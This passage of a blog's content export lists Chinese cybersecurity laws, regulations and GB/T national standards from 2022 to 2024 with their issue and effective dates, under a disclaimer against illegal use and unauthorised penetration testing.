42012-2022](https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=136B8F06A548FAE8ABB375E4C65C1E38) | 信息安全技术 即时通信服务数据安全要求                        | 2022-10-14 | 2023-05-01 |\n| [GB/T 42015-2022](https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=CEB5771DBBF05ED5EA99EBA50896537F) | 信息安全技术 网络支付服务数据安全要求                        | 2022-10-14 | 2023-05-01 |\n| [GB/T 42017-2022](https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=182AA2DDF9F1EB9A69193B9CA528BBC4) | 信息安全技术 网络预约汽车服务数据安全要求                    | 2022-10-14 | 2023-05-01 |\n| [GB/T 42016-2022](https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=20615352AC128FC97F8005161976B921) | 信息安全技术 网络音视频服务数据安全要求                      | 2022-10-14 | 2023-05-01 |\n| [GB/T 42013-2022](https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=CDBCE8F2E4CDE60A86092361A8796178) | 信息安全技术 快递物流服务数据安全要求                        | 2022-10-14 | 2023-05-01 |\n| [GB/T 41871-2022](https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=4D3C5BB193E079AD54294E5845749B8F) | 信息安全技术 汽车数据处理安全要求                            | 2022-10-14 | 2023-05-01 |\n| [GB/T 39204-2022](https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=1D986D9DCCC518D19DAD9431DD76053E) | 信息安全技术 关键信息基础设施安全保护要求                    | 2022-10-12 | 2023-05-01 |\n| [GB/T 41578-2022](https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=5D7C9B95DB5F844C84F2F6C08843E2BB) | 电动汽车充电系统信息安全技术要求及试验方法                   | 2022-07-11 | 2023-02-01 |\n| [GB/T 41400-2022](https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=B4272EB52F5930B214910854EFEA4C5F) | 信息安全技术 工业控制系统信息安全防护能力成熟度模型          | 2022-04-15 | 2022-11-01 |\n| [GB/T 20984-2022](https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=FDA38AB7D08A715C6B6D69DFDEABB2C0) | 信息安全技术 信息安全风险评估方法                            | 2022-04-15 | 2022-11-01 |\n| [GB/T 41574-2022](https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=2134DD3D7ED96B383E61C496D6E19D58) | 信息技术 安全技术 公有云中个人信息保护实践指南               | 2022-07-11 | 2023-02-01 |\n| [GB/T 41387-2022](http://std.samr.gov.cn/gb/search/gbDetailed?id=DD3D95E5C12A71EBE05397BE0A0AF33F) | 信息安全技术 智能家居通用安全规范                            | 2022-04-15 | 2022-11-01 |\n| [GB/T 41388-2022](http://std.samr.gov.cn/gb/search/gbDetailed?id=DD3D95E5C12C71EBE05397BE0A0AF33F) | 信息安全技术 可信执行环境 基本安全规范                       | 2022-04-15 | 2022-11-01 |\n| [GB/T 41389-2022](http://std.samr.gov.cn/gb/search/gbDetailed?id=DD3D95E5C12E71EBE05397BE0A0AF33F) | 信息安全技术 SM9 密码算法使用规范                             | 2022-04-15 | 2022-11-01 |\n| [GB/T 41391-2022](http://std.samr.gov.cn/gb/search/gbDetailed?id=DD3D95E5C13071EBE05397BE0A0AF33F) | 信息安全技术 移动互联网应用程序（App）收集个人信息基本要求   | 2022-04-15 | 2022-11-01 |\n| [GB/T 41479-2022](http://std.samr.gov.cn/gb/search/gbDetailed?id=DD3D95E5C12471EBE05397BE0A0AF33F) | 信息安全技术 网络数据处理安全要求                            | 2022-04-15 | 2022-11-01 |\n| [GB/T 20984-2022](http://std.samr.gov.cn/gb/search/gbDetailed?id=DD3D95E5C09371EBE05397BE0A0AF33F) | 信息安全技术 信息安全风险评估方法<br />代替标准号：[GB/T 20984-2007](http://std.samr.gov.cn/gb/search/gbDetailed?id=71F772D786C1D3A7E05397BE0A0AB82A) 信息安全技术 信息安全风险评估规范 | 2022-04-15 | 2022-11-01 |\n| [GB/T 29829-2022](http://std.samr.gov.cn/gb/search/gbDetailed?id=DD3D95E5C12171EBE05397BE0A0AF33F) | 信息安全技术 可信计算密码支撑平台功能与接口规范<br />代替标准号：[GB/T  29829-2013](http://std.samr.gov.cn/gb/search/gbDetailed?id=71F772D7E974D3A7E05397BE0A0AB82A) 信息安全技术 可信计算密码支撑平台功能与接口规范 | 2022-04-15 | 2022-11-01 |\n| [GB/T 30283-2022](http://std.samr.gov.cn/gb/search/gbDetailed?id=DD3D95E5C13471EBE05397BE0A0AF33F) | 信息安全技术 信息安全服务 分类与代码<br />代替标准号：[GB/T 30283-2013](http://std.samr.gov.cn/gb/search/gbDetailed?id=71F772D7EDA9D3A7E05397BE0A0AB82A) 信息安全技术 信息安全服务 分类 | 2022-04-15 | 2022-11-01 |\n| [GB/T 31506-2022](http://std.samr.gov.cn/gb/search/gbDetailed?id=DD3D95E5C12B71EBE05397BE0A0AF33F) | 信息安全技术 政务网站系统安全指南<br />代替标准号：[GB/T 31506-2015](http://std.samr.gov.cn/gb/search/gbDetailed?id=71F772D804F5D3A7E05397BE0A0AB82A) 信息安全技术 政府门户网站系统安全技术指南 | 2022-04-15 | 2022-11-01 |\n| [GB/T 25069-2022](https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=56123482721B1AC3CEDCD3B5C022CAD8) | 信息安全技术 术语                                            | 2022-03-09 | 2022-10-01 |\n|                                                              | [网络安全审查办法](http://www.cac.gov.cn/2022-01/04/c_1642894602182845.htm) | 2022-01-04 | 2022-2-15  |\n\n### 2021 年及以前（按体系分类）\n\n#### 一般性法律规定\n\n- 《中华人民共和国宪法》，法律效力位阶：宪法，施行日期：2018-03-11\n- 《中华人民共和国国家安全法》，法律效力位阶：法律，施行日期：2015-07-01\n- 《中华人民共和国治安管理处罚法》，法律效力位阶：法律，施行日期：2013-01-01\n- 《中华人民共和国保守国家秘密法》，法律效力位阶：法律，施行日期：2010-10-01\n\n#### 规范和惩罚信息网络犯罪的法律\n\n- 《中华人民共和国刑法》，法律效力位阶：法律，施行日期：2021-03-01\n- 《全国人民代表大会常务委员会关于维护互联网安全的决定》法律效力位阶：有关法律问题和重大问题的决定，施行日期：2000-12-28\n\n#### 直接针对信息安全的特别规定\n\n- 《中华人民共和国网络安全法》，法律效力位阶：法律，施行日期：2017-06-01\n- 《中华人民共和国计算机信息系统安全保护条例》，法律效力位阶：行政法规，公布日期：2011-01-08\n- 《中华人民共和国电信条例》，法律效力位阶：行政法规，公布日期：2016-02-06\n- 《中华人民共和国计算机信息网络国际联网管理暂行规定》，法律效力位阶：行政法规，公布日期：1997-05-20\n- 《计算机信息网络国际联网安全保护管理办法》，法律效力位阶：行政法规，公布日期：2011-01-08\n\n#### 具体规范信息安全技术、信息安全管理\n\n- 《中华人民共和国电子签名法》，法律效力位阶：法律，施行日期：2019-04-23\n- 《计算机软件保护条例》，法律效力位阶：行政法规，公布日期：2013-01-30\n- 《商用密码管理条例》，法律效力位阶：行政法规，公布日期：1999-10-07\n- 《中华人民共和国保守国家秘密法实施条例》，法律效力位阶：行政法规，公布日期：2014-01-17\n- GB/T 37090-2018《信息安全技术 病毒防治产品安全技术要求和测试评价方法》，施行日期：2019-07-01\n- 《计算机信息系统国际联网保密管理规定》，颁布单位：国家保密局，施行日期：2000-01-01\n- 《金融机构计算机信息系统安全保护工作暂行规定》，颁布单位：公安部，颁布时间：1998-08-31\n\n## 关键词\n\n### 安全等级保护\n\n- GB/T 22240-2020，《信息安全技术 网络安全等级保护定级指南》，发布日期：2020-04-28，2020-11-01\n- GB/T 25058-2019，《信息安全技术 网络安全等级保护实施指南》，发布日期：2019-08-30，2020-03-01\n- GB/T 25070-2019，《信息安全技术 网络安全等级保护安全设计技术要求》，发布日期：2019-05-10，2019-12-01\n- GB/T 22239-2019，《信息安全技术 网络安全等级保护基本要求》，发布日期：2019-05-10，2019-12-01\n- GB/T 28448-2019，《信息安全技术 网络安全等级保护测评要求》，发布日期：2019-05-10，2019-12-01\n- GB/T 28449-2018，《信息安全技术 网络安全等级保护测评过程指南》，发布日期：2018-12-28，2019-07-01\n- GB/T 36958-2018，《信息安全技术 网络安全等级保护安全管理中心技术要求》，发布日期：2018-12-28，2019-07-01\n- GB/T 36959-2018，《信息安全技术 网络安全等级保护测评机构能力要求和评估规范》，发布日期：2018-12-28，2019-07-01\n- GB/T 37138-2018，《电力信息系统安全等级保护实施指南》，发布日期：2018-12-28，2019-07-01\n- GB/T 36627-2018，《信息安全技术 网络安全等级保护测试评估技术指南》，发布日期：2018-09-17，2019-04-01\n- GB/T 35317-2017，《公安物联网系统信息安全等级保护要求》，发布日期：2017-12-29，2017-12-29\n\n### 数据安全\n\n- GB/T 43739-2024《数据安全技术 应用商店的移动互联网应用程序（App）个人信息处理规范性审核与管理指南》，发布日期：2024-04-25，实施日期：2024-11-01\n- GB/T 43697-2024《数据安全技术 数据分类分级规则》，发布日期：2024-03-15，实施日期：2024-10-01\n- GB/T 42775-2023《证券期货业数据安全风险防控 数据分类分级指引》，发布日期：2023-08-06，实施日期：2023-08-06\n- GB/T 35274-2023《数据安全技术 大数据服务安全能力要求》，发布日期：2023-08-06，实施日期：2024-03-01\n- GB/T 42447-2023《信息安全技术 电信领域数据安全指南》，发布日期：2023-03-17，实施日期：2023-10-01\n- GB/T 41819-2022《信息安全技术 人脸识别数据安全要求》，发布日期：2022-10-14，实施日期：2023-05-01\n- GB/T 41806-2022《信息安全技术 基因识别数据安全要求》，发布日期：2022-10-14，实施日期：2023-05-01\n- GB/T 41773-2022《信息安全技术 步态识别数据安全要求》，发布日期：2022-10-14，实施日期：2023-05-01\n- GB/T 41807-2022《信息安全技术 声纹识别数据安全要求》，发布日期：2022-10-14，实施日期：2023-05-01\n- GB/T 42014-2022《信息安全技术 网上购物服务数据安全要求》，发布日期：2022-10-14，实施日期：2023-05-01\n- GB/T 42012-2022《信息安全技术 即时通信服务数据安全要求》，发布日期：2022-10-14，实施日期：2023-05-01\n- GB/T 42015-2022《信息安全技术 网络支付服务数据安全要求》，发布日期：2022-10-14，实施日期：2023-05-01\n- GB/T 42017-2022《信息安全技术 网络预约汽车服务数据安全要求》，发布日期：2022-10-14，实施日期：2023-05-01\n- GB/T 42016-2022《信息安全技术 网络音视频服务数据安全要求》，发布日期：2022-10-14，实施日期：2023-05-01\n- GB/T 42013-2022《信息安全技术 快递物流服务数据安全要求》，发布日期：2022-10-14，实施日期：2023-05-01\n- GB/T 39725-2020《信息安全技术 健康医疗数据安全指南》，发布日期：2020-12-14，实施日期：2021-07-01\n- GB/T 39477-2020《信息安全技术 政务信息共享 数据安全技术要求》，发布日期：2020-11-19，实施日期：2021-06-01\n- GB/T 37973-2019《信息安全技术 大数据安全管理指南》，发布日期：2019-08-30，实施日期：2020-03-01\n- GB/T 37988-2019《信息安全技术 数据安全能力成熟度模型》，发布日期：2019-08-30，实施日期：2020-03-01\n- GB/T 37373-2019《智能交通 数据安全服务》，发布日期：2019-05-10，实施日期：2019-12-01\n\n### 开源软件\n\n- GB/T 42927-2023《金融行业开源软件测评规范》，发布日期：2023-08-06，实施日期：2023-08-06\n\n### 信创\n\n- 网络关键设备和网络安全专用产品安全认证和安全检测结果检索，发布日期：2024-06-28（共 3286 项，符合标准 GB 42250-2022 等）\n- 《网络关键设备和网络安全专用产品目录》，发布日期：2023-07-03","source":"用户协议/index.md","raw":"---\ntitle: 免责声明\ntop_img: https://img.090227.xyz/file/ae62475a131f3734a201c.png\ndate: 2024-12-02 14:49:45\ntype:\nupdated:\ncomments:\ndescription:\nkeywords:\nmathjax:\nkatex:\naside:\naplayer:\nhighlight_shrink:\ntop_single_background:\n---\n# SmallHao免责声明 #\n\n**【免责声明】本博客所涉及的技术、思路和工具仅供学习，任何人不得将其用于非法用途和盈利，不得将其用于非授权渗透测试，否则后果自行承担，与本博客无关。**\n\n一个网络安全法律法规、安全政策、国家标准、行业标准知识库。\n\n## 资源导航\n\n- 公安部公布打击黑客犯罪 10 起典型案例：https://mp.weixin.qq.com/s/vKqjc1uTajClu7bsn9yfLA\n- 公安部公布“百日行动”期间打击网络违法犯罪十大典型案例：https://news.cctv.com/2022/09/08/ARTIQLE0cQRPbqjPxAsOeUFe220908.shtml\n- 国家标准全文公开系统：http://openstd.samr.gov.cn/bzgk/gb/index\n- 国家法律法规数据库：https://flk.npc.gov.cn/index.html\n- 全国标准信息公共服务平台：http://std.samr.gov.cn/\n- 自 2017 年 1 月 1 日后新发布的标准将在发布后 20 个工作日内公开\n- 国家互联网信息办公室 ：http://www.cac.gov.cn/\n\n## 法律法规\n\n### 常见标准代号\n\n- 强制性国家标准代号 GB\n- 推荐性国家标准代号 GB/T\n- 指导性技术文件代号 GB/Z\n- 实物标准代号 GSB\n\n### 2024 年新发布\n\n| 标准号               | 标准名称                                                          | 发布日期       | 实施日期       |\n| ----------------- | ------------------------------------------------------------- | ---------- | ---------- |\n| GB/T 44810.2-2024 | IPv6 网络安全设备技术要求 第 2 部分：Web 应用防护系统（WAF）                        | 2024-10-26 | 2025-02-01 |\n| GB/T 44810.1-2024 | IPv6 网络安全设备技术要求 第 1 部分：防火墙                                    | 2024-10-26 | 2025-02-01 |\n| GB/T 44810.3-2024 | IPv6 网络安全设备技术要求 第 3 部分：入侵防御系统（IPS）                            | 2024-10-26 | 2025-02-01 |\n| GB/T 44862-2024   | 网络安全技术 网络弹性评价准则                                               | 2024-10-26 | 2025-05-01 |\n| GB/T 31500-2024   | 网络安全技术 存储介质数据恢复服务安全规范                                         | 2024-10-26 | 2025-05-01 |\n| GB/T 44778-2024   | 汽车诊断接口信息安全技术要求及试验方法                                           | 2024-10-26 | 2024-10-26 |\n| GB/T 44774-2024   | 汽车信息安全应急响应管理规范                                                | 2024-10-26 | 2024-10-26 |\n| GB/T 44602-2024   | 网络安全技术 智能门锁网络安全技术规范                                           | 2024-09-29 | 2025-04-01 |\n| GB/T 44462.2-2024 | 工业互联网企业网络安全 第 2 部分：平台企业防护要求                                   | 2024-09-29 | 2025-01-01 |\n| GB/T 44462.3-2024 | 工业互联网企业网络安全 第 3 部分：标识解析企业防护要求                                 | 2024-09-29 | 2025-01-01 |\n| GB/T 44462.1-2024 | 工业互联网企业网络安全 第 1 部分：应用工业互联网的工业企业防护要求                           | 2024-09-29 | 2025-01-01 |\n| GB/T 15852.2-2024 | 网络安全技术 消息鉴别码 第 2 部分：采用专门设计的杂凑函数的机制                            | 2024-09-29 | 2025-04-01 |\n| GB/T 29244-2024   | 网络安全技术 办公设备安全规范                                               | 2024-09-29 | 2025-04-01 |\n| GB/T 20279-2024   | 网络安全技术 网络和终端隔离产品技术规范                                          | 2024-09-29 | 2025-04-01 |\n| GB/T 22081-2024   | 网络安全技术 信息安全控制                                                 | 2024-09-29 | 2025-04-01 |\n| GB/T 15843.2-2024 | 网络安全技术 实体鉴别 第 2 部分：采用鉴别式加密的机制                                 | 2024-09-29 | 2025-04-01 |\n| GB/T 18238.1-2024 | 网络安全技术 杂凑函数 第 1 部分：总则                                         | 2024-09-29 | 2025-04-01 |\n| GB/T 18238.2-2024 | 网络安全技术 杂凑函数 第 2 部分：采用分组密码的杂凑函数                                | 2024-09-29 | 2025-04-01 |\n| GB/T 18238.3-2024 | 网络安全技术 杂凑函数 第 3 部分：专门设计的杂凑函数                                  | 2024-09-29 | 2025-04-01 |\n| GB/T 44585.1-2024 | 风险管理在接入 IT 网络的医疗器械中的应用 第 1 部分：联网医疗器械或健康软件在其实施和使用中的安全、有效性和网络安全 | 2024-09-29 | 2026-04-01 |\n| GB 44495-2024     | 汽车整车信息安全技术要求                                                  | 2024-08-23 | 2026-01-01 |\n| GB/T 43848-2024   | 网络安全技术 软件产品开源代码安全评价方法                                         | 2024-04-25 | 2024-11-01 |\n| GB/T 43779-2024   | 网络安全技术 基于密码令牌的主叫用户可信身份鉴别技术规范                                  | 2024-04-25 | 2024-11-01 |\n| GB/T 43741-2024   | 网络安全技术 网络安全众测服务要求                                             | 2024-04-25 | 2024-11-01 |\n| GB/T 43698-2024   | 网络安全技术 软件供应链安全要求                                              | 2024-04-25 | 2024-11-01 |\n| GB/T 43696-2024   | 网络安全技术 零信任参考体系架构                                              | 2024-04-25 | 2024-11-01 |\n| GB/T 43694-2024   | 网络安全技术 证书应用综合服务接口规范                                           | 2024-04-25 | 2024-11-01 |\n| GB/T 33565-2024   | 网络安全技术 无线局域网接入系统安全技术要求                                        | 2024-04-25 | 2024-11-01 |\n| GB/T 33563-2024   | 网络安全技术 无线局域网客户端安全技术要求                                         | 2024-04-25 | 2024-11-01 |\n| GB/T 30270-2024   | 网络安全技术 信息技术安全评估方法                                             | 2024-04-25 | 2024-11-01 |\n| GB/T 18336.5-2024 | 网络安全技术 信息技术安全评估准则 第 5 部分：预定义的安全要求包                            | 2024-04-25 | 2024-11-01 |\n| GB/T 18336.4-2024 | 网络安全技术 信息技术安全评估准则 第 4 部分：评估方法和活动的规范框架                         | 2024-04-25 | 2024-11-01 |\n| GB/T 18336.3-2024 | 网络安全技术 信息技术安全评估准则 第 3 部分：安全保障组件                               | 2024-04-25 | 2024-11-01 |\n| GB/T 18336.2-2024 | 网络安全技术 信息技术安全评估准则 第 2 部分：安全功能组件                               | 2024-04-25 | 2024-11-01 |\n| GB/T 18336.1-2024 | 网络安全技术 信息技术安全评估准则 第 1 部分：简介和一般模型                              | 2024-04-25 | 2024-11-01 |\n| GB/T 17903.3-2024 | 网络安全技术 抗抵赖 第 3 部分：用非对称技术的机制                                   | 2024-03-15 | 2024-10-01 |\n| GB/T 31497-2024   | 网络安全技术 信息安全管理 监视、测量、分析和评价                                     | 2024-03-15 | 2024-10-01 |\n| GB/T 17903.1-2024 | 网络安全技术 抗抵赖 第 1 部分：概述                                          | 2024-03-15 | 2024-10-01 |\n| GB/T 15843.4-2024 | 网络安全技术 实体鉴别 第 4 部分：用密码校验函数的机制                                 | 2024-03-15 | 2024-10-01 |\n\n### 2023 年新发布\n\n| 标准号               | 标准名称                                  | 发布日期       | 实施日期       |\n| ----------------- | ------------------------------------- | ---------- | ---------- |\n| GB/T 43578-2023   | 信息安全技术 通用密码服务接口规范                     | 2023-12-28 | 2024-07-01 |\n| GB/T 43577.1-2023 | 信息安全技术 电子发现 第 1 部分：概述和概念              | 2023-12-28 | 2024-07-01 |\n| GB/T 35290-2023   | 信息安全技术 射频识别（RFID）系统安全技术规范             | 2023-12-28 | 2024-07-01 |\n| GB/T 43557-2023   | 信息安全技术 网络安全信息报送指南                     | 2023-12-28 | 2024-07-01 |\n| GB/T 29246-2023   | 信息安全技术 信息安全管理体系 概述和词汇                 | 2023-12-28 | 2024-07-01 |\n| GB/T 43532-2023   | 核电厂仪表和控制系统网络安全防范管控                    | 2023-12-28 | 2024-04-01 |\n| GB/T 43269-2023   | 信息安全技术 网络安全应急能力评估准则                   | 2023-11-27 | 2024-06-01 |\n| GB/T 43435-2023   | 信息安全技术 移动互联网应用程序（App）软件开发工具包（SDK）安全要求 | 2023-11-27 | 2024-06-01 |\n| GB/T 43445-2023   | 信息安全技术 移动智能终端预置应用软件基本安全要求             | 2023-11-27 | 2024-06-01 |\n| GB/T 43026-2023   | 公共安全视频监控联网信息安全测试规范                    | 2023-09-07 | 2024-10-01 |\n| GB/T 42971-2023   | 第三方电子合同服务平台信息安全技术要求                   | 2023-09-07 | 2024-04-01 |\n| GB/T 43046-2023   | 信息技术服务 应对突发公共安全事件的信息技术应急风险管理          | 2023-09-07 | 2024-04-01 |\n| GB/T 43207-2023   | 信息安全技术 信息系统密码应用设计指南                   | 2023-09-07 | 2024-04-01 |\n| GB/T 43206-2023   | 信息安全技术 信息系统密码应用测评要求                   | 2023-09-07 | 2024-04-01 |\n| GB/T 32916-2023   | 信息安全技术 信息安全控制评估指南                     | 2023-09-07 | 2024-04-01 |\n| GB/T 32914-2023   | 信息安全技术 网络安全服务能力要求                     | 2023-09-07 | 2024-04-01 |\n| GB/T 42884-2023   | 信息安全技术 移动互联网应用程序（App）生命周期安全管理指南       | 2023-08-06 | 2024-03-01 |\n| GB/T 42888-2023   | 信息安全技术 机器学习算法安全评估规范                   | 2023-08-06 | 2024-03-01 |\n| GB/T 35274-2023   | 信息安全技术 大数据服务安全能力要求                    | 2023-08-06 | 2024-03-01 |\n| GB/Z 42885-2023   | 信息安全技术 网络安全信息共享指南                     | 2023-08-06 | 2024-03-01 |\n| GB/T 42926-2023   | 金融信息系统网络安全风险评估规范                      | 2023-08-06 | 2023-12-01 |\n| GB/T 42708-2023   | 金融网络安全威胁信息共享指南                        | 2023-08-06 | 2023-08-06 |\n| GB/T 42589-2023   | 信息安全技术 电子凭据服务安全规范                     | 2023-05-23 | 2023-12-01 |\n| GB/T 24364-2023   | 信息安全技术 信息安全风险管理实施指南                   | 2023-05-23 | 2023-12-01 |\n| GB/T 31168-2023   | 信息安全技术 云计算服务安全能力要求                    | 2023-05-23 | 2023-12-01 |\n| GB/T 31167-2023   | 信息安全技术 云计算服务安全指南                      | 2023-05-23 | 2023-12-01 |\n| GB/T 42574-2023   | 信息安全技术 个人信息处理中告知和同意的实施指南              | 2023-05-23 | 2023-12-01 |\n| GB/T 42572-2023   | 信息安全技术 可信执行环境服务规范                     | 2023-05-23 | 2023-12-01 |\n| GB/T 42583-2023   | 信息安全技术 政务网络安全监测平台技术规范                 | 2023-05-23 | 2023-12-01 |\n| GB/T 42571-2023   | 信息安全技术 区块链信息服务安全规范                    | 2023-05-23 | 2023-12-01 |\n| GB/T 42582-2023   | 信息安全技术 移动互联网应用程序（App）个人信息安全测评规范       | 2023-05-23 | 2023-12-01 |\n| GB/T 42570-2023   | 信息安全技术 区块链技术安全框架                      | 2023-05-23 | 2023-12-01 |\n| GB/T 42564-2023   | 信息安全技术 边缘计算安全技术要求                     | 2023-05-23 | 2023-12-01 |\n| GB/T 28451-2023   | 信息安全技术 网络入侵防御产品技术规范                   | 2023-05-23 | 2023-12-01 |\n| GB/T 20945-2023   | 信息安全技术 网络安全审计产品技术规范                   | 2023-05-23 | 2023-12-01 |\n| GB/T 30282-2023   | 信息安全技术 反垃圾邮件产品技术规范                    | 2023-05-23 | 2023-12-01 |\n| GB/T 20986-2023   | 信息安全技术 网络安全事件分类分级指南                   | 2023-05-23 | 2023-12-01 |\n| GB/T 42573-2023   | 信息安全技术 网络身份服务安全技术要求                   | 2023-05-23 | 2023-12-01 |\n| GB/T 35282-2023   | 信息安全技术 电子政务移动办公系统安全技术规范               | 2023-05-23 | 2023-12-01 |\n| GB/T 32920-2023   | 信息安全技术 行业间和组织间通信的信息安全管理               | 2023-05-23 | 2023-12-01 |\n| GB/T 42447-2023   | 信息安全技术 电信领域数据安全指南                     | 2023-03-17 | 2023-10-01 |\n| GB/T 42453-2023   | 信息安全技术 网络安全态势感知通用技术要求                 | 2023-03-17 | 2023-10-01 |\n| GB/T 42460-2023   | 信息安全技术 个人信息去标识化效果评估指南                 | 2023-03-17 | 2023-10-01 |\n| GB/T 32922-2023   | 信息安全技术 IPSec VPN 安全接入基本要求与实施指南        | 2023-03-17 | 2023-10-01 |\n| GB/T 21054-2023   | 信息安全技术 公钥基础设施 PKI 系统安全测评方法            | 2023-03-17 | 2023-10-01 |\n| GB/T 21053-2023   | 信息安全技术 公钥基础设施 PKI 系统安全技术要求            | 2023-03-17 | 2023-10-01 |\n| GB/T 20274.1-2023 | 信息安全技术 信息系统安全保障评估框架 第 1 部分：简介和一般模型    | 2023-03-17 | 2023-10-01 |\n| GB/T 33134-2023   | 信息安全技术 公共域名服务系统安全要求                   | 2023-03-17 | 2023-10-01 |\n| GB/T 42461-2023   | 信息安全技术 网络安全服务成本度量指南                   | 2023-03-17 | 2023-10-01 |\n| GB/T 42446-2023   | 信息安全技术 网络安全从业人员能力基本要求                 | 2023-03-17 | 2023-10-01 |\n\n### 2022 年新发布\n\n| 标准号                                                       | 名称                                                         | 发布日期   | 实施日期   |\n| ------------------------------------------------------------ | ------------------------------------------------------------ | ---------- | ---------- |\n| [GB 42250-2022](https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=97F140EC1874D4C25CB8DC53B1D102D0) | 信息安全技术 网络安全专用产品安全技术要求                    | 2022-12-29 | 2023-07-01 |\n| [GB/T 41817-2022](https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=62C795EBF1BF0200A7161718CEFAABA8) | 信息安全技术 个人信息安全工程指南                            | 2022-10-14 | 2023-05-01 |\n| [GB/T 41819-2022](https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=BE74B9780B8C4852D62CF47F282478B6) | 信息安全技术 人脸识别数据安全要求                            | 2022-10-14 | 2023-05-01 |\n| [GB/T 41806-2022](https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=EACA08F5F077771ACE82FBE7987F40AE) | 信息安全技术 基因识别数据安全要求                            | 2022-10-14 | 2023-05-01 |\n| [GB/T 41773-2022](https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=2137495F032BA9E69A753016027D271C) | 信息安全技术 步态识别数据安全要求                            | 2022-10-14 | 2023-05-01 |\n| [GB/T 41807-2022](https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=AF1E9400C0F9C7051C33F773274825EA) | 信息安全技术 声纹识别数据安全要求                            | 2022-10-14 | 2023-05-01 |\n| [GB/T 42014-2022](https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=9679A3BF5D736D7FC92FD8157AAAAC82) | 信息安全技术 网上购物服务数据安全要求                        | 2022-10-14 | 2023-05-01 |\n| [GB/T 42012-2022](https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=136B8F06A548FAE8ABB375E4C65C1E38) | 信息安全技术 即时通信服务数据安全要求                        | 2022-10-14 | 2023-05-01 |\n| [GB/T 42015-2022](https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=CEB5771DBBF05ED5EA99EBA50896537F) | 信息安全技术 网络支付服务数据安全要求                        | 2022-10-14 | 2023-05-01 |\n| [GB/T 42017-2022](https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=182AA2DDF9F1EB9A69193B9CA528BBC4) | 信息安全技术 网络预约汽车服务数据安全要求                    | 2022-10-14 | 2023-05-01 |\n| [GB/T 42016-2022](https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=20615352AC128FC97F8005161976B921) | 信息安全技术 网络音视频服务数据安全要求                      | 2022-10-14 | 2023-05-01 |\n| [GB/T 42013-2022](https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=CDBCE8F2E4CDE60A86092361A8796178) | 信息安全技术 快递物流服务数据安全要求                        | 2022-10-14 | 2023-05-01 |\n| [GB/T 41871-2022](https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=4D3C5BB193E079AD54294E5845749B8F) | 信息安全技术 汽车数据处理安全要求                            | 2022-10-14 | 2023-05-01 |\n| [GB/T 39204-2022](https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=1D986D9DCCC518D19DAD9431DD76053E) | 信息安全技术 关键信息基础设施安全保护要求                    | 2022-10-12 | 2023-05-01 |\n| [GB/T 41578-2022](https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=5D7C9B95DB5F844C84F2F6C08843E2BB) | 电动汽车充电系统信息安全技术要求及试验方法                   | 2022-07-11 | 2023-02-01 |\n| [GB/T 41400-2022](https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=B4272EB52F5930B214910854EFEA4C5F) | 信息安全技术 工业控制系统信息安全防护能力成熟度模型          | 2022-04-15 | 2022-11-01 |\n| [GB/T 20984-2022](https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=FDA38AB7D08A715C6B6D69DFDEABB2C0) | 信息安全技术 信息安全风险评估方法                            | 2022-04-15 | 2022-11-01 |\n| [GB/T 41574-2022](https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=2134DD3D7ED96B383E61C496D6E19D58) | 信息技术 安全技术 公有云中个人信息保护实践指南               | 2022-07-11 | 2023-02-01 |\n| [GB/T 41387-2022](http://std.samr.gov.cn/gb/search/gbDetailed?id=DD3D95E5C12A71EBE05397BE0A0AF33F) | 信息安全技术 智能家居通用安全规范                            | 2022-04-15 | 2022-11-01 |\n| [GB/T 41388-2022](http://std.samr.gov.cn/gb/search/gbDetailed?id=DD3D95E5C12C71EBE05397BE0A0AF33F) | 信息安全技术 可信执行环境 基本安全规范                       | 2022-04-15 | 2022-11-01 |\n| [GB/T 41389-2022](http://std.samr.gov.cn/gb/search/gbDetailed?id=DD3D95E5C12E71EBE05397BE0A0AF33F) | 信息安全技术 SM9 密码算法使用规范                             | 2022-04-15 | 2022-11-01 |\n| [GB/T 41391-2022](http://std.samr.gov.cn/gb/search/gbDetailed?id=DD3D95E5C13071EBE05397BE0A0AF33F) | 信息安全技术 移动互联网应用程序（App）收集个人信息基本要求   | 2022-04-15 | 2022-11-01 |\n| [GB/T 41479-2022](http://std.samr.gov.cn/gb/search/gbDetailed?id=DD3D95E5C12471EBE05397BE0A0AF33F) | 信息安全技术 网络数据处理安全要求                            | 2022-04-15 | 2022-11-01 |\n| [GB/T 20984-2022](http://std.samr.gov.cn/gb/search/gbDetailed?id=DD3D95E5C09371EBE05397BE0A0AF33F) | 信息安全技术 信息安全风险评估方法<br />代替标准号：[GB/T 20984-2007](http://std.samr.gov.cn/gb/search/gbDetailed?id=71F772D786C1D3A7E05397BE0A0AB82A) 信息安全技术 信息安全风险评估规范 | 2022-04-15 | 2022-11-01 |\n| [GB/T 29829-2022](http://std.samr.gov.cn/gb/search/gbDetailed?id=DD3D95E5C12171EBE05397BE0A0AF33F) | 信息安全技术 